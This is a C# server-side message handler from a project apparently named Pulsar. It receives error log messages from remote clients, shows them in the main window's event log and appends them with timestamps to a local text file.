using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Forms;
using Pulsar.Server.Networking;
using System.Windows.Forms;

namespace Pulsar.Server.Messages
{
    // I literally copied all of this from another handler and shoved it in here

    /// <summary>
    /// Handles messages for the interaction with the remote client status.
    /// </summary>
    public class ClientDebugLog : MessageProcessorBase<object>
    {
        public delegate void DebugLogEventHandler(object sender, Client client, string log);

        public event DebugLogEventHandler DebugLogReceived;

        public ClientDebugLog() : base(true)
        {
        }

        public override bool CanExecute(IMessage message)
        {
            return message is GetDebugLog;
        }

        public override bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public override void Execute(ISender sender, IMessage message)
        {
            if (message is GetDebugLog logMessage)
            {
                Execute((Client)sender, logMessage);
            }
        }

        private void Execute(Client client, GetDebugLog message)
        {
            DebugLogReceived?.Invoke(this, client, message.Log);
            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null)
            {
                frm.EventLog("[CLIENT ERROR: " + client.Value.UserAtPc + ": " + message.Log, "error");
                LogToFile("[CLIENT ERROR: " + client.Value.UserAtPc + ": " + message.Log);
            }
        }

        private void LogToFile(string text)
        {
            //check if log file exists. If it does append to it.
            string logFilePath = "client_debug_log.txt";
            if (System.IO.File.Exists(logFilePath))
            {
                using (var writer = new System.IO.StreamWriter(logFilePath, true))
                {
                    writer.WriteLine($"{System.DateTime.Now}: {text}");
                }
            }
            else
            {
                using (var writer = new System.IO.StreamWriter(logFilePath))
                {
                    writer.WriteLine($"{System.DateTime.Now}: {text}");
                }
            }
        }
    }
}